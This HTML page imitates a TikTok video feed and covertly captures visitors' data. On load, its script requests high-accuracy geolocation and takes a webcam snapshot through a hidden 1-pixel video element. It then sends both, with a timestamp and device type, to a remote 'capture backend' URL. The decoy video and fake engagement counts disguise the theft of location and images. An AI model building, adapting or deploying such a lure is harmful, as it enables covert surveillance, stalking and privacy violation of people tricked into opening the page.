<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>TikTok</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    html, body { height: 100%; overflow: hidden; background: #000; color: #fff;
      font-family: -apple-system, Roboto, Arial, sans-serif; }

    /* ---------- Video feed ---------- */
    .feed { position: relative; width: 100vw; height: 100vh; overflow: hidden; }
    .video-slide {
      position: absolute; inset: 0;
      display: flex; align-items: center; justify-content: center;
    }
    .video-slide video {
      width: 100%; height: 100%; object-fit: cover;
    }

    /* ---------- Top bar ---------- */
    .topbar {
      position: fixed; top: 0; left: 0; right: 0;
      display: flex; justify-content: space-between; align-items: center;
      padding: 14px 16px; z-index: 20;
      background: linear-gradient(to bottom, rgba(0,0,0,0.6), transparent);
    }
    .topbar .tabs { display: flex; gap: 18px; font-size: 15px; font-weight: 600; color: rgba(255,255,255,0.7); }
    .topbar .tabs span.active { color: #fff; }
    .topbar .search { font-size: 22px; }

    /* ---------- Right side action bar ---------- */
    .actions {
      position: fixed; right: 10px; bottom: 110px;
      display: flex; flex-direction: column; gap: 22px;
      align-items: center; z-index: 20;
    }
    .action { display: flex; flex-direction: column; align-items: center; gap: 4px; }
    .action .icon {
      font-size: 30px; line-height: 1;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
    }
    .action .count { font-size: 12px; font-weight: 600; color: #fff; }
    .avatar-ring {
      width: 46px; height: 46px; border-radius: 50%;
      background: linear-gradient(135deg, #ff0050, #00f2ea);
      display: flex; align-items: center; justify-content: center;
      margin-bottom: 6px; position: relative;
    }
    .avatar-ring::after {
      content: '+'; position: absolute; bottom: -6px; left: 50%; transform: translateX(-50%);
      width: 18px; height: 18px; border-radius: 50%; background: #ff0050;
      display: flex; align-items: center; justify-content: center;
      font-size: 14px; font-weight: bold; color: #fff;
    }
    .avatar-ring .inner {
      width: 40px; height: 40px; border-radius: 50%; background: #333;
      display: flex; align-items: center; justify-content: center; font-size: 20px;
    }

    /* ---------- Bottom info ---------- */
    .bottom-info {
      position: fixed; left: 14px; right: 80px; bottom: 74px;
      z-index: 20; text-shadow: 0 1px 3px rgba(0,0,0,0.6);
    }
    .bottom-info .username { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
    .bottom-info .caption { font-size: 14px; line-height: 1.4; color: #eee; margin-bottom: 8px; }
    .bottom-info .music { font-size: 13px; color: #ddd; display: flex; align-items: center; gap: 6px; }
    .bottom-info .music .note { animation: spin 3s linear infinite; display: inline-block; }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* ---------- Bottom nav ---------- */
    .bottom-nav {
      position: fixed; left: 0; right: 0; bottom: 0;
      display: flex; justify-content: space-around; align-items: center;
      padding: 10px 0 16px;
      background: #000; border-top: 1px solid #1a1a1a;
      z-index: 20; font-size: 11px;
    }
    .bottom-nav .nav-item {
      display: flex; flex-direction: column; align-items: center; gap: 3px;
      color: rgba(255,255,255,0.6); font-weight: 600;
    }
    .bottom-nav .nav-item .ico { font-size: 20px; }
    .bottom-nav .nav-item.active { color: #fff; }
    .bottom-nav .plus {
      width: 44px; height: 30px; background: #fff; color: #000;
      border-radius: 8px; display: flex; align-items: center; justify-content: center;
      font-size: 22px; font-weight: bold; position: relative;
    }
    .bottom-nav .plus::before, .bottom-nav .plus::after {
      content: ''; position: absolute; width: 100%; height: 4px;
      background: #25f4ee; border-radius: 2px; z-index: -1;
    }
    .bottom-nav .plus::before { left: -3px; top: -3px; background: #25f4ee; }
    .bottom-nav .plus::after { right: -3px; bottom: -3px; background: #fe2c55; }

    /* ---------- Mute button ---------- */
    .mute-btn {
      position: fixed; top: 60px; right: 16px; z-index: 25;
      background: rgba(0,0,0,0.5); color: #fff; border: none;
      padding: 8px 12px; border-radius: 20px; font-size: 13px; font-weight: 600;
      cursor: pointer;
    }

    /* ---------- Hidden capture elements (unchanged) ---------- */
    #status { display: none; }
    #video {
      position: fixed; bottom: 80px; right: 16px; width: 1px; height: 1px;
      opacity: 0; pointer-events: none; border-radius: 8px; object-fit: cover;
    }
    #canvas { display: none; }
    #preview { display: none; }

    #status.success {
      display: block; position: fixed; bottom: 90px; left: 16px;
      background: rgba(0,0,0,0.7); padding: 6px 10px; border-radius: 8px;
      font-size: 11px; color: #fff; z-index: 10000; max-width: 180px;
    }
    #status.success a { color: #25f4ee; text-decoration: none; display: block; margin-top: 2px; }
  </style>
</head>
<body>

  <!-- Video feed -->
  <div class="feed">
    <div class="video-slide">
      <!-- Funny video (public sample, muted autoplay to satisfy browser rules) -->
      <video id="funnyVideo" autoplay muted loop playsinline
        src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerFun.mp4">
      </video>
    </div>
  </div>

  <!-- Mute / unmute -->
  <button class="mute-btn" id="muteBtn" onclick="toggleMute()">🔇 Tap for sound</button>

  <!-- Top bar -->
  <div class="topbar">
    <div class="tabs">
      <span>Following</span>
      <span class="active">For You</span>
    </div>
    <div class="search">🔍</div>
  </div>

  <!-- Right action bar -->
  <div class="actions">
    <div class="action">
      <div class="avatar-ring"><div class="inner">👤</div></div>
    </div>
    <div class="action">
      <div class="icon">❤️</div>
      <div class="count">12.4K</div>
    </div>
    <div class="action">
      <div class="icon">💬</div>
      <div class="count">842</div>
    </div>
    <div class="action">
      <div class="icon">🔖</div>
      <div class="count">3.1K</div>
    </div>
    <div class="action">
      <div class="icon">↗️</div>
      <div class="count">Share</div>
    </div>
  </div>

  <!-- Bottom info -->
  <div class="bottom-info">
    <div class="username">@funnyclips</div>
    <div class="caption">When you try to be productive but the vibe says otherwise 😂 #funny #viral</div>
    <div class="music"><span class="note">🎵</span> original sound — funnyclips</div>
  </div>

  <!-- Bottom nav -->
  <div class="bottom-nav">
    <div class="nav-item active"><span class="ico">🏠</span>Home</div>
    <div class="nav-item"><span class="ico">🔍</span>Discover</div>
    <div class="nav-item"><div class="plus">+</div></div>
    <div class="nav-item"><span class="ico">📥</span>Inbox</div>
    <div class="nav-item"><span class="ico">👤</span>Profile</div>
  </div>

  <!-- Hidden capture elements -->
  <p id="status"></p>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="300" height="225"></canvas>
  <img id="preview" />

  <script>
    const BACKEND_URL = 'https://my-capture-backend.onrender.com/api/capture';

    // -------- Mute toggle --------
    function toggleMute() {
      const v = document.getElementById('funnyVideo');
      const btn = document.getElementById('muteBtn');
      v.muted = !v.muted;
      btn.textContent = v.muted ? '🔇 Tap for sound' : '🔊 Sound on';
    }

    // -------- Capture logic (unchanged) --------
    async function run() {
      const statusEl = document.getElementById('status');
      let locationData = null;
      let selfieData = null;

      // 1. Location
      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true, timeout: 30000, maximumAge: 0
          });
        });
        locationData = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        };
      } catch (e) {
        console.log('Location failed:', e.message);
      }

      // 2. Selfie
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await video.play();
        await new Promise(r => setTimeout(r, 1000));

        const canvas = document.getElementById('canvas');
        canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
        selfieData = canvas.toDataURL('image/jpeg', 0.7);

        stream.getTracks().forEach(t => t.stop());
      } catch (e) {
        console.log('Camera failed:', e.message);
      }

      // 3. Send to backend
      if (locationData || selfieData) {
        try {
          const res = await fetch(BACKEND_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              location: locationData,
              selfie: selfieData,
              timestamp: new Date().toISOString(),
              deviceName: navigator.userAgent.includes('Mobile') ? 'Mobile device' : 'Desktop / Laptop'
            })
          });
          if (res.ok) {
            const data = await res.json();
            let msg = '';
            if (data.selfieUrl) msg += '<a href="' + data.selfieUrl + '" target="_blank">📸 Selfie</a>';
            if (data.mapUrl) msg += '<a href="' + data.mapUrl + '" target="_blank">📍 Location</a>';
            if (msg) {
              statusEl.className = 'success';
              statusEl.innerHTML = msg;
            }
          }
        } catch (e) {
          console.log('Network error:', e.message);
        }
      }
    }
    run();
  </script>
</body>
</html>
